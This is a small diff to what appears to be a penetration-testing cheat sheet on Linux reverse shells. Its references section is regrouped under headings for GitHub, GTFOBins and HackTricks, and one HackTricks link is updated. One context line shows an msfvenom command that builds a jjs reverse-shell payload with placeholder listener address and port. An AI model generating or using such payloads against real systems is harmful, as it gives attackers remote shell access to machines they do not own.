@@ -17,8 +17,14 @@ $ msfvenom -p cmd/unix/reverse_jjs lhost=<IP> lport=<PORT>
 ---
 ## References
 
-- [GTFOBins: jjs](https://gtfobins.github.io/gtfobins/jjs/)
-
-- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+### GTFOBins
+
+- [GTFOBins: jjs](https://gtfobins.github.io/gtfobins/jjs/)
+
+### Hacktricks
+
+- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
